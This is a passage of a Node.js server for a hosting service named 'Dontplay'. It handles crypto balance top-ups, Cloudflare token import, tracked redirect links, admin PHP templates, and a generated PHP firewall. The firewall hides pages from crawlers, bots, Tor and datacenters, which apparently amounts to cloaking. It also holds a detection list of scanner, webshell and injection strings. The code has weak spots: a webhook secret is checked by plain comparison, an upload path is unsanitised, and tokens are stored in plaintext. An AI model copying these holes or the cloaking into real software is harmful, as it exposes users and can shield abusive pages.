        return res.status(400).json({ error: `Réseau non supporté pour ${cleanCurrency.toUpperCase()}. Choisissez : ${availableNetworks.map(n => n.label).join(', ')}` });
      }
    } else {
      selectedNetwork = '';
    }

    const user = await db.findUserById(req.session.userId);
    if (!user) return res.status(401).json({ error: 'Session invalide.' });

    const orderId = `dontplay_${user.id}_${Date.now()}_${crypto.randomUUID().slice(0,8)}`;

    const payload = {
      price_amount: parseFloat(amount),
      price_currency: 'eur',
      pay_currency: getNowPaymentsCurrencyCode(cleanCurrency, selectedNetwork),
      order_id: orderId,
      order_description: `Recharge solde Dontplay — ${parseFloat(amount)}€ (${cleanCurrency.toUpperCase()})`,
      ipn_callback_url: `${req.protocol}://${req.get('host')}/api/payments/crypto/webhook`,
      is_fixed_rate: true,
      is_fee_paid_by_user: true,
    };

    const payment = await npApi('/payment', {
      method: 'POST',
      body: JSON.stringify(payload),
    });

    /* Stocker la transaction en attente dans l'utilisateur */
    const pendingTx = {
      id: payment.payment_id?.toString() || crypto.randomUUID(),
      orderId,
      amount: parseFloat(amount),
      currency: cleanCurrency,
      network: selectedNetwork || null,
      cryptoAmount: payment.pay_amount || null,
      cryptoAddress: payment.pay_address || null,
      status: payment.payment_status || 'waiting',
      createdAt: new Date().toISOString(),
      expiresAt: payment.expiration_estimate_date || null,
      invoiceUrl: payment.invoice_url || null,
    };

    const existingPending = Array.isArray(user.pendingPayments) ? user.pendingPayments : [];
    await db.updateUser(user.id, {
      pendingPayments: [...existingPending, pendingTx].slice(-50), // garder 50 dernières
    });

    res.json({
      success: true,
      payment: {
        id: pendingTx.id,
        orderId,
        amount: pendingTx.amount,
        currency: pendingTx.currency,
        network: pendingTx.network,
        cryptoAmount: pendingTx.cryptoAmount,
        cryptoAddress: pendingTx.cryptoAddress,
        status: pendingTx.status,
        invoiceUrl: pendingTx.invoiceUrl,
        expiresAt: pendingTx.expiresAt,
      },
    });
  } catch (err) {
    console.error('[np/create]', err);
    res.status(502).json({ error: err.message });
  }
});

/* GET /api/payments/crypto/status/:paymentId — statut du paiement */
app.get('/api/payments/crypto/status/:paymentId', requireAuth, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    const pending = (user?.pendingPayments ?? []).find(p => p.id === req.params.paymentId);
    if (!pending) return res.status(404).json({ error: 'Paiement introuvable.' });

    const data = await npApi(`/payment/${req.params.paymentId}`);
    res.json({
      paymentId: data.payment_id,
      status: data.payment_status,
      cryptoAmount: data.pay_amount,
      actuallyPaid: data.actually_paid,
      confirmed: data.payment_status === 'finished' || data.payment_status === 'confirmed',
    });
  } catch (err) {
    console.error('[np/status]', err);
    res.status(502).json({ error: err.message });
  }
});

/* POST /api/payments/crypto/webhook — IPN callback NowPayments */
app.post('/api/payments/crypto/webhook', async (req, res) => {
  try {
    const cfg = config.nowpayments;
    const body = req.body;

    /* Vérification IPN secret si configuré */
    if (cfg.ipnSecret) {
      const receivedSecret = req.headers['x-nowpayments-sig'] || req.body?.ipn_secret || '';
      if (receivedSecret !== cfg.ipnSecret) {
        console.warn('[np/webhook] IPN secret mismatch');
        return res.status(403).json({ error: 'Invalid IPN secret' });
      }
    }

    const paymentId = body.payment_id?.toString();
    const status = body.payment_status;
    const orderId = body.order_id || '';
    const actuallyPaid = parseFloat(body.actually_paid || 0);
    const payCurrency = body.pay_currency || '';

    console.log(`[np/webhook] payment=${paymentId} status=${status} order=${orderId} amount=${actuallyPaid} ${payCurrency}`);

    /* Extraire userId du order_id: dontplay_{userId}_... */
    const userIdMatch = orderId.match(/^dontplay_([^_]+)_/);
    if (!userIdMatch) {
      console.warn('[np/webhook] Order ID invalide:', orderId);
      return res.status(400).json({ error: 'Invalid order ID' });
    }
    const userId = userIdMatch[1];

    const user = await db.findUserById(userId);
    if (!user) {
      console.warn('[np/webhook] Utilisateur introuvable:', userId);
      return res.status(404).json({ error: 'Utilisateur introuvable' });
    }

    /* Mettre à jour le statut du paiement dans pendingPayments */
    const pendingPayments = (user.pendingPayments ?? []).map(p =>
      p.id === paymentId ? { ...p, status, actuallyPaid } : p
    );

    const updateData = { pendingPayments };

    /* Si le paiement est confirmé/finished, créditer le solde */
    if ((status === 'finished' || status === 'confirmed') && actuallyPaid > 0) {
      /* Trouver le montant original en EUR depuis le pending payment */
      const pending = (user.pendingPayments ?? []).find(p => p.id === paymentId);
      const creditAmount = pending?.amount || parseFloat(actuallyPaid);

      const newBalance = parseFloat(((user.balance ?? 0) + creditAmount).toFixed(2));
      const totalSpent = parseFloat(((user.totalSpent ?? 0) + creditAmount).toFixed(2));
      const tx = makeTx({
        type: 'crypto_deposit',
        amount: creditAmount,
        label: `Dépôt crypto (${payCurrency.toUpperCase()}) — ${actuallyPaid} ${payCurrency.toUpperCase()}`,
        by: 'user',
      });

      updateData.balance = newBalance;
      updateData.totalSpent = totalSpent;
      updateData.transactions = pushTx(user, tx);

      console.log(`[np/webhook] ✓ Crédité ${creditAmount}€ à ${user.username} (payment ${paymentId})`);
    }

    await db.updateUser(userId, updateData);
    res.json({ success: true });
  } catch (err) {
    console.error('[np/webhook]', err);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

/* ═══════════════════════════════════════════════════════════════
    CLOUDFLARE — Connexion token / zones / import
   ═══════════════════════════════════════════════════════════════ */

/* Helper : appel CF API */
async function cfApi(token, path, opts = {}) {
  const r = await fetch(`https://api.cloudflare.com/client/v4${path}`, {
    ...opts,
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type':  'application/json',
      ...(opts.headers || {}),
    },
  });
  return r.json();
}

/* GET /api/domains/cloudflare/status */
app.get('/api/domains/cloudflare/status', requireAuth, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    res.json({ connected: !!(user?.cloudflareToken) });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* POST /api/domains/cloudflare/connect — vérifier + sauvegarder token */
app.post('/api/domains/cloudflare/connect', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { token } = req.body;
    if (!token?.trim()) return res.status(400).json({ error: 'Token requis.' });

    // Vérifier le token via CF API (verify token endpoint)
    const verify = await cfApi(token.trim(), '/user/tokens/verify');
    if (!verify.success) {
      return res.status(400).json({ error: 'Token Cloudflare invalide ou révoqué.' });
    }

    await db.updateUser(req.session.userId, { cloudflareToken: token.trim() });
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* POST /api/domains/cloudflare/disconnect */
app.post('/api/domains/cloudflare/disconnect', requireAuth, validateCsrf, async (req, res) => {
  try {
    await db.updateUser(req.session.userId, { cloudflareToken: null });
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* GET /api/domains/cloudflare/zones — lister les zones du compte CF */
app.get('/api/domains/cloudflare/zones', requireAuth, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    if (!user?.cloudflareToken) return res.status(400).json({ error: 'Cloudflare non connecté.' });

    const data = await cfApi(user.cloudflareToken, '/zones?per_page=50&status=active');
    if (!data.success) return res.status(400).json({ error: data.errors?.[0]?.message || 'Erreur CF.' });

    const existingNames = new Set((user.domains ?? []).map(d => d.name.toLowerCase()));
    const zones = (data.result || []).map(z => ({
      id:           z.id,
      name:         z.name,
      status:       z.status,
      planName:     z.plan?.name || 'Free',
      alreadyAdded: existingNames.has(z.name.toLowerCase()),
    }));
    res.json(zones);
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* POST /api/domains/cloudflare/import — importer zones sélectionnées */
app.post('/api/domains/cloudflare/import', requireAuth, validateCsrf, async (req, res) => {
  try {
    const { zones } = req.body;
    if (!Array.isArray(zones) || !zones.length) return res.status(400).json({ error: 'Aucune zone.' });

    const user = await db.findUserById(req.session.userId);
    if (!user?.cloudflareToken) return res.status(400).json({ error: 'Cloudflare non connecté.' });

    const plan = config.plans[user.plan];
    const existing = user.domains ?? [];
    const existingNames = new Set(existing.map(d => d.name.toLowerCase()));

    const toAdd = zones.filter(z => !existingNames.has(z.name.toLowerCase()));
    // Si l'utilisateur n'a pas de plan (admin ou sans abonnement), pas de limite
    if (plan && existing.length + toAdd.length > plan.domainsMax) {
      return res.status(402).json({
        error: `Limite atteinte : ${plan.domainsMax} domaine(s) max avec le plan ${plan.name}.`,
      });
    }

    const now = new Date().toISOString();
    const newDomains = toAdd.map(z => ({
      id:        crypto.randomUUID(),
      name:      z.name,
      source:    'cloudflare',
      zoneId:    z.id,
      status:    z.status,
      createdAt: now,
      expiresAt: null,
      cfPlan:    z.planName,
      cfNs:      [],
      pointing:  null,
    }));

    await db.updateUser(user.id, { domains: [...existing, ...newDomains] });
    res.json({ success: true, imported: newDomains.length });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* ── Transaction helper ──────────────────────────────────────── */
function makeTx({ type, amount, label, by = 'user' }) {
  return { id: crypto.randomUUID(), type, amount, label, by, date: new Date().toISOString() };
}
function pushTx(user, tx) {
  const txs = Array.isArray(user.transactions) ? user.transactions : [];
  return [...txs, tx].slice(-200); // garder 200 dernières
}

/* ═══════════════════════════════════════════════════════════════
   ADMIN MIDDLEWARE
   ═══════════════════════════════════════════════════════════════ */
async function requireAdmin(req, res, next) {
  if (!req.session?.userId) return res.status(401).json({ error: 'Non authentifié.' });
  try {
    const user = await db.findUserById(req.session.userId);
    if (!user || user.role !== 'admin') return res.status(403).json({ error: 'Accès refusé.' });
    next();
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
}

/* ═══════════════════════════════════════════════════════════════
   TEMPLATES  (fichiers PHP stockés dans data/templates/ — bloqué)
   ═══════════════════════════════════════════════════════════════ */
const TEMPLATES_JSON = path.resolve(ROOT, 'data', 'templates.json');
const TEMPLATES_DIR  = path.resolve(ROOT, 'data', 'templates');

function readTemplates() {
  try {
    if (!fs.existsSync(TEMPLATES_JSON)) return [];
    return JSON.parse(fs.readFileSync(TEMPLATES_JSON, 'utf8'));
  } catch { return []; }
}

function writeTemplates(list) {
  const tmp = TEMPLATES_JSON + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(list, null, 2), 'utf8');
  fs.renameSync(tmp, TEMPLATES_JSON);
}

const REDIRECTS_JSON = path.resolve(ROOT, 'data', 'redirects.json');

function readRedirects() {
  try {
    if (!fs.existsSync(REDIRECTS_JSON)) return { redirects: [] };
    return JSON.parse(fs.readFileSync(REDIRECTS_JSON, 'utf8'));
  } catch {
    return { redirects: [] };
  }
}

function writeRedirects(data) {
  const tmp = REDIRECTS_JSON + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2), 'utf8');
  fs.renameSync(tmp, REDIRECTS_JSON);
}

function normalizeSlug(slug) {
  return String(slug || '')
    .trim()
    .toLowerCase()
    .replace(/[^a-z0-9-_.]/g, '-')
    .replace(/^-+|-+$/g, '');
}

function normalizeDomain(domain) {
  if (!domain) return '';
  let cleaned = String(domain).trim().toLowerCase();
  cleaned = cleaned.replace(/^https?:\/\//, '');
  cleaned = cleaned.replace(/^www\./, '');
  cleaned = cleaned.replace(/\/+$/, '');
  return cleaned;
}

function serializeRedirect(r) {
  return {
    id: r.id,
    userId: r.userId,
    domain: r.domain,
    type: r.type,
    slug: r.slug,
    targetType: r.targetType,
    targetValue: r.targetValue,
    targetUrl: r.targetUrl,
    redirectType: r.redirectType,
    notes: r.notes || '',
    clicks: r.clicks || 0,
    stats: Array.isArray(r.stats) ? r.stats : [],
    active: r.active !== false,
    createdAt: r.createdAt,
    updatedAt: r.updatedAt,
  };
}

function findRedirectById(id) {
  return readRedirects().redirects.find(r => r.id === id) || null;
}

function findRedirectByTypeAndSlug(type, slug) {
  return readRedirects().redirects.find(r => r.type === type && r.slug === slug && r.active !== false) || null;
}

function saveRedirect(redirect) {
  const data = readRedirects();
  const now = new Date().toISOString();
  const normalized = {
    id: redirect.id || crypto.randomUUID(),
    userId: redirect.userId,
    domain: normalizeDomain(redirect.domain),
    type: ['png', 'html', 'php', 'text'].includes(redirect.type) ? redirect.type : (redirect.type === 'meta' ? 'php' : 'text'),
    slug: normalizeSlug(redirect.slug),
    targetType: ['page', 'external', 'domain'].includes(redirect.targetType) ? redirect.targetType : 'external',
    targetValue: String(redirect.targetValue || '').trim(),
    targetUrl: String(redirect.targetUrl || '').trim(),
    redirectType: ['301', '302'].includes(String(redirect.redirectType)) ? String(redirect.redirectType) : '302',
    notes: String(redirect.notes || '').trim(),
    clicks: Number.isFinite(Number(redirect.clicks)) ? Number(redirect.clicks) : 0,
    stats: Array.isArray(redirect.stats) ? redirect.stats : [],
    active: redirect.active !== false,
    createdAt: redirect.createdAt || now,
    updatedAt: now,
  };

  const idx = data.redirects.findIndex(r => r.id === normalized.id);
  if (idx === -1) data.redirects.push(normalized);
  else data.redirects[idx] = { ...data.redirects[idx], ...normalized };
  writeRedirects(data);
  return data.redirects.find(r => r.id === normalized.id);
}

function deleteRedirect(id) {
  const data = readRedirects();
  const before = data.redirects.length;
  data.redirects = data.redirects.filter(r => r.id !== id);
  writeRedirects(data);
  return data.redirects.length !== before;
}

function incrementRedirectHit(redirect) {
  if (!redirect) return null;
  const data = readRedirects();
  const idx = data.redirects.findIndex(r => r.id === redirect.id);
  if (idx === -1) return redirect;
  const now = new Date();
  const day = now.toISOString().slice(0, 10);
  redirect.clicks = (redirect.clicks || 0) + 1;
  redirect.stats = Array.isArray(redirect.stats) ? redirect.stats : [];
  const dayStats = redirect.stats.find(s => s.day === day);
  if (dayStats) dayStats.count += 1;
  else redirect.stats.push({ day, count: 1 });
  redirect.updatedAt = now.toISOString();
  data.redirects[idx] = redirect;
  writeRedirects(data);
  return redirect;
}

function escapeHtml(value) {
  return String(value || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/* GET /api/templates — liste (auth requis) */
app.get('/api/templates', requireAuth, (req, res) => {
  const list = readTemplates().map(t => {
    const logoPath = ['png','jpg','jpeg','webp','svg'].map(e => path.join(TEMPLATES_DIR, t.id, `logo.${e}`)).find(fs.existsSync);
    return logoPath ? { ...t, logoUrl: `/api/templates/${t.id}/logo` } : t;
  });
  res.json(list);
});

/* GET /api/templates/:id/logo — sert l'image logo */
app.get('/api/templates/:id/logo', requireAuth, (req, res) => {
  const safeId = path.basename(req.params.id);
  const dir    = path.join(TEMPLATES_DIR, safeId);
  if (!dir.startsWith(TEMPLATES_DIR)) return res.status(400).end();
  const exts = ['png','jpg','jpeg','webp','svg'];
  const file = exts.map(e => path.join(dir, `logo.${e}`)).find(fs.existsSync);
  if (!file) return res.status(404).end();
  res.sendFile(file);
});

/* POST /api/templates/:id/logo — upload logo (base64) */
app.post('/api/templates/:id/logo', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const { data, ext } = req.body;
    if (!data || !ext) return res.status(400).json({ error: 'data et ext requis.' });
    const safeExt = ext.replace(/[^a-z]/g, '').slice(0, 5);
    const dir = path.join(TEMPLATES_DIR, req.params.id);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    // Supprimer ancien logo
    ['png','jpg','jpeg','webp','svg'].forEach(e => { try { fs.unlinkSync(path.join(dir, `logo.${e}`)); } catch {} });
    fs.writeFileSync(path.join(dir, `logo.${safeExt}`), Buffer.from(data, 'base64'));
    res.json({ success: true, logoUrl: `/api/templates/${req.params.id}/logo` });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* ═══════════════════════════════════════════════════════════════
   REDIRECTIONS: stockage et routage public
   ═══════════════════════════════════════════════════════════════ */
app.get('/api/redirects', requireAuth, (req, res) => {
  const redirects = readRedirects().redirects
    .filter(r => r.userId === req.session.userId)
    .map(serializeRedirect);
  res.json({ redirects });
});

app.post('/api/redirects', requireAuth, redirectsLimiter, validateCsrf, security.validators.createRedirect, security.handleValidationErrors, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    if (!user) return res.status(401).json({ error: 'Session invalide.' });

    const {
      domainId,
      domainName,
      type = 'text',
      slug,
      destinationType = 'external',
      destination,
      redirectType = '302',
      notes = '',
    } = req.body || {};

    const userDomain = Array.isArray(user.domains)
      ? user.domains.find(d => d.id === domainId)
      : null;
    const domain = normalizeDomain(userDomain?.name || domainName || '');
    if (!domain) return res.status(400).json({ error: 'Domaine porteur requis.' });

    const normalizedSlug = normalizeSlug(slug);
    const existing = readRedirects().redirects.find(r => r.slug === normalizedSlug && r.type === type && r.domain === domain);
    if (existing) return res.status(409).json({ error: 'Ce slug existe déjà pour ce domaine / type.' });

    let targetUrl = String(destination || '').trim();
    if (destinationType === 'page') {
      const page = (user.pages || []).find(p => p.id === destination);
      if (!page) return res.status(400).json({ error: 'Page introuvable.' });
      if (page.domain) targetUrl = `https://${normalizeDomain(page.domain)}`;
      else targetUrl = `${req.protocol}://${req.get('host')}/pages/${page.id}`;
    } else if (destinationType === 'domain') {
      const dest = normalizeDomain(destination);
      targetUrl = dest.startsWith('http://') || dest.startsWith('https://') ? dest : `https://${dest}`;
    }
    if (!targetUrl || !/^https?:\/\//i.test(targetUrl)) {
      return res.status(400).json({ error: 'Destination invalide.' });
    }

    const redirect = saveRedirect({
      userId: req.session.userId,
      domain,
      type,
      slug: normalizedSlug,
      targetType: destinationType,
      targetValue: String(destination).trim(),
      targetUrl,
      redirectType: String(redirectType) === '301' ? '301' : '302',
      notes: security.sanitizeContent(notes),
      clicks: 0,
      stats: [],
      active: true,
    });

    res.json({ success: true, redirect: serializeRedirect(redirect) });
  } catch (err) {
    console.error('[redirects/create]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

app.patch('/api/redirects/:id', requireAuth, validateCsrf, async (req, res) => {
  const redirect = findRedirectById(req.params.id);
  if (!redirect || redirect.userId !== req.session.userId) return res.status(404).json({ error: 'Redirection introuvable.' });
  const { active, notes, targetUrl } = req.body || {};
  if (active !== undefined) redirect.active = !!active;
  if (notes !== undefined) redirect.notes = String(notes).trim();
  if (targetUrl !== undefined && /^https?:\/\//i.test(String(targetUrl))) redirect.targetUrl = String(targetUrl).trim();
  const updated = saveRedirect(redirect);
  res.json({ success: true, redirect: serializeRedirect(updated) });
});

app.delete('/api/redirects/:id', requireAuth, validateCsrf, async (req, res) => {
  const redirect = findRedirectById(req.params.id);
  if (!redirect || redirect.userId !== req.session.userId) return res.status(404).json({ error: 'Redirection introuvable.' });
  deleteRedirect(req.params.id);
  res.json({ success: true });
});

app.get('/api/redirects/:id/stats', requireAuth, async (req, res) => {
  const redirect = findRedirectById(req.params.id);
  if (!redirect || redirect.userId !== req.session.userId) return res.status(404).json({ error: 'Redirection introuvable.' });
  res.json({ stats: redirect.stats || [], clicks: redirect.clicks || 0 });
});

app.get('/api/redirects/:id/export', requireAuth, async (req, res) => {
  const redirect = findRedirectById(req.params.id);
  if (!redirect || redirect.userId !== req.session.userId) return res.status(404).json({ error: 'Redirection introuvable.' });
  const rows = ['day,count', ...(Array.isArray(redirect.stats) ? redirect.stats : []).map(s => `${s.day},${s.count}`)];
  res.type('text/csv').send(rows.join('\n'));
});

/* Admin — toutes les redirections */
app.get('/api/admin/redirects', requireAuth, requireAdmin, adminLimiter, async (req, res) => {
  try {
    const users = await db.getAllUsers();
    const userMap = Object.fromEntries(users.map(u => [u.id, u.username]));
    const redirects = readRedirects().redirects
      .map(r => ({ ...serializeRedirect(r), username: userMap[r.userId] || '—' }))
      .sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
    const totalClicks = redirects.reduce((n, r) => n + (r.clicks || 0), 0);
    res.json({ redirects, total: redirects.length, totalClicks, active: redirects.filter(r => r.active).length });
  } catch (err) {
    console.error('[admin/redirects]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

app.patch('/api/admin/redirects/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  const redirect = findRedirectById(req.params.id);
  if (!redirect) return res.status(404).json({ error: 'Redirection introuvable.' });
  const { active, notes, targetUrl } = req.body || {};
  if (active !== undefined) redirect.active = !!active;
  if (notes !== undefined) redirect.notes = String(notes).trim();
  if (targetUrl !== undefined && /^https?:\/\//i.test(String(targetUrl))) redirect.targetUrl = String(targetUrl).trim();
  const updated = saveRedirect(redirect);
  res.json({ success: true, redirect: serializeRedirect(updated) });
});

app.delete('/api/admin/redirects/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  const redirect = findRedirectById(req.params.id);
  if (!redirect) return res.status(404).json({ error: 'Redirection introuvable.' });
  deleteRedirect(req.params.id);
  res.json({ success: true });
});

app.get('/r/:type/:slug', (req, res) => {
  let { type, slug } = req.params;
  if (!['png', 'html', 'php'].includes(type)) {
    slug = type;
    type = 'text';
  }
  const redirect = findRedirectByTypeAndSlug(type, slug);
  if (!redirect) return res.status(404).send('Lien introuvable.');
  incrementRedirectHit(redirect);
  if (type === 'png') {
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/w8AAwMCAO2a6w8AAAAASUVORK5CYII=',
      'base64'
    );
    res.set('Content-Type', 'image/png');
    res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    return res.send(pixel);
  }
  if (type === 'html') {
    return res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Redirection</title><style>body,html{margin:0;height:100%}iframe{border:none;width:100%;height:100%;}</style></head><body><iframe src="${escapeHtml(redirect.targetUrl)}" sandbox="allow-scripts allow-same-origin allow-popups"></iframe></body></html>`);
  }
  if (type === 'php') {
    return res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=${escapeHtml(redirect.targetUrl)}"></head><body></body></html>`);
  }
  return res.redirect(Number(redirect.redirectType) === 301 ? 301 : 302, redirect.targetUrl);
});

app.get('/r/:slug', (req, res) => {
  const slug = normalizeSlug(req.params.slug);
  const redirect = findRedirectByTypeAndSlug('text', slug);
  if (!redirect) return res.status(404).send('Lien introuvable.');
  incrementRedirectHit(redirect);
  return res.redirect(Number(redirect.redirectType) === 301 ? 301 : 302, redirect.targetUrl);
});

/* POST /api/templates — upload (admin, content base64) */
app.post('/api/templates', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const { name, cats, gradient, tags, badge, content } = req.body;
    if (!name || !content) return res.status(400).json({ error: 'name et content requis.' });

    if (!fs.existsSync(TEMPLATES_DIR)) fs.mkdirSync(TEMPLATES_DIR, { recursive: true });

    const id       = crypto.randomUUID();
    const fileData = Buffer.from(content, 'base64');
    fs.writeFileSync(path.join(TEMPLATES_DIR, id + '.php'), fileData);

    const tpl = {
      id,
      name:       name.trim(),
      cats:       Array.isArray(cats) ? cats : ['other'],
      gradient:   gradient || 'g-indigo',
      tags:       Array.isArray(tags) ? tags : [],
      badge:      badge || null,
      uploadedAt: new Date().toISOString(),
    };
    const list = readTemplates();
    list.push(tpl);
    writeTemplates(list);
    res.json({ success: true, template: tpl });
  } catch (err) {
    console.error('[templates/upload]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* PATCH /api/templates/:id — mise à jour schema/meta (admin) */
app.patch('/api/templates/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const { configSchema, name, cats, gradient, tags, badge } = req.body;
    const list = readTemplates().map(t => {
      if (t.id !== req.params.id) return t;
      const updated = { ...t };
      if (name)         updated.name   = name.trim();
      if (cats)         updated.cats   = cats;
      if (gradient)     updated.gradient = gradient;
      if (tags)         updated.tags   = tags;
      if (badge !== undefined) updated.badge = badge;
      if (Array.isArray(configSchema)) updated.configSchema = configSchema;
      return updated;
    });
    writeTemplates(list);
    res.json({ success: true });
  } catch (err) {
    console.error('[templates/patch]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

/* DELETE /api/templates/:id — suppression (admin) */
app.delete('/api/templates/:id', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const id   = req.params.id;
    const list = readTemplates().filter(t => t.id !== id);
    writeTemplates(list);
    const file = path.join(TEMPLATES_DIR, id + '.php');
    if (fs.existsSync(file)) fs.unlinkSync(file);
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Erreur serveur.' }); }
});

/* ═══════════════════════════════════════════════════════════════
   DEPLOY HELPERS
   ═══════════════════════════════════════════════════════════════ */
const { exec }       = require('child_process');
const PAGES_DIR      = path.resolve(ROOT, 'data', 'pages');
const PAGES_MAP_JSON = path.resolve(ROOT, 'data', 'pages-map.json');
const NGINX_MAP_FILE = path.resolve(ROOT, 'data', 'nginx-map.conf');

function copyDirSync(src, dest) {
  fs.mkdirSync(dest, { recursive: true });
  for (const entry of fs.readdirSync(src, { withFileTypes: true })) {
    const s = path.join(src, entry.name);
    const d = path.join(dest, entry.name);
    if (entry.isDirectory()) copyDirSync(s, d);
    else fs.copyFileSync(s, d);
  }
}

function generateFirewallPhp() {
  return `<?php
ini_set('display_errors', 0);
error_reporting(0);
ini_set('log_errors', 1);

// ── Headers de sécurité ───────────────────────────────────────
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Permissions-Policy: geolocation=(), microphone=(), camera=()');
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
header_remove('X-Powered-By');
header_remove('Server');

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

include(__DIR__ . '/config.php');
if (file_exists(__DIR__ . '/firewall_config.php')) include(__DIR__ . '/firewall_config.php');

// ── Répertoire de logs (Panel/ ou panel/ selon le template) ──
$_fw_log_dir = is_dir(__DIR__ . '/Panel/logs') ? __DIR__ . '/Panel/logs' : __DIR__ . '/panel/logs';
@mkdir($_fw_log_dir, 0750, true);

// ── Auto-purge des logs (>1MB) ────────────────────────────────
function _fw_purge_logs() {
    global $_fw_log_dir;
    $logFiles = [
        $_fw_log_dir . '/ip_ban.txt',
        $_fw_log_dir . '/captcha_attempts.json',
        $_fw_log_dir . '/captcha_ban.log',
        $_fw_log_dir . '/progressive_bans.log',
        __DIR__ . '/prevents/ban_attempts.json',
        __DIR__ . '/prevents/banned_ips.txt',
    ];
    foreach ($logFiles as $file) {
        if (file_exists($file) && filesize($file) > 1048576) {
            if (substr($file, -5) === '.json') {
                @file_put_contents($file, '{}', LOCK_EX);
            } else {
                @file_put_contents($file, '', LOCK_EX);
            }
        }
    }
}
_fw_purge_logs();

// ── Détection de scans d'URL ──────────────────────────────────
function _fw_detect_url_scan() {
    global $_fw_log_dir;
    $suspiciousPatterns = [
        'wp-admin', 'wp-content', 'wp-includes', 'wp-login',
        'phpmyadmin', 'pma', 'myadmin', 'mysql',
        '.env', '.git', '.svn', '.htaccess', '.htpasswd',
        'sqlmap', 'nikto', 'nmap', 'masscan', 'burp',
        'administrator', 'admin.php', 'setup.php', 'install.php',
        'shell.php', 'c99.php', 'r57.php', 'webshell',
        'config.php.bak', 'backup.zip', 'dump.sql',
        '../', '%2e%2e', '%252e%252e',
        '<script', '%3cscript', 'javascript:',
        'union+select', 'union%20select', "' or '",
    ];
    $uri = strtolower($_SERVER['REQUEST_URI'] ?? '');
    $qs  = strtolower($_SERVER['QUERY_STRING'] ?? '');
    foreach ($suspiciousPatterns as $pattern) {
        if (strpos($uri, $pattern) !== false || strpos($qs, $pattern) !== false) {
            $logEntry = sprintf("[%s] SCAN | IP: %s | URI: %s | UA: %s\\n",
                date('Y-m-d H:i:s'), $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                $_SERVER['REQUEST_URI'] ?? '', $_SERVER['HTTP_USER_AGENT'] ?? 'unknown');
            @file_put_contents($_fw_log_dir . '/scan_attempts.log', $logEntry, FILE_APPEND | LOCK_EX);
            $blockImmediately = ['../','%2e%2e','%252e%252e','<script','%3cscript',
                                 'javascript:','union+select','union%20select',"' or '",
                                 'shell.php','c99.php','r57.php','webshell'];
            foreach ($blockImmediately as $block) {
                if (strpos($uri, $block) !== false || strpos($qs, $block) !== false) {
                    http_response_code(404); exit;
                }
            }
            break;
        }
    }
}
_fw_detect_url_scan();

// Page hors ligne
if (!empty($page_offline)) {
    http_response_code(503);
    echo "<!DOCTYPE html><html lang='fr'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Site en maintenance</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0a0f;color:#e2e4f0;min-height:100vh;display:flex;align-items:center;justify-content:center}body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(circle,rgba(255,255,255,0.04) 1px,transparent 1px);background-size:28px 28px;pointer-events:none}.wrap{text-align:center;padding:40px 24px;max-width:480px}.icon{font-size:48px;margin-bottom:20px}.title{font-size:22px;font-weight:700;margin-bottom:10px;letter-spacing:-.01em}.sub{font-size:14px;color:#6b6f8a;line-height:1.6}</style></head><body><div class='wrap'><div class='icon'>🔧</div><div class='title'>Site en maintenance</div><div class='sub'>Ce site est temporairement indisponible. Veuillez réessayer dans quelques instants.</div></div></body></html>";
    exit;
}

// Defaults
if (!isset($test_mode))         $test_mode         = false;
if (!isset($anti_bot_enabled))  $anti_bot_enabled  = true;
if (!isset($block_proxy))       $block_proxy       = true;
if (!isset($block_vpn))         $block_vpn         = false;
if (!isset($block_tor))         $block_tor         = true;
if (!isset($block_dc))          $block_dc          = true;
if (!isset($block_empty_ua))    $block_empty_ua    = true;
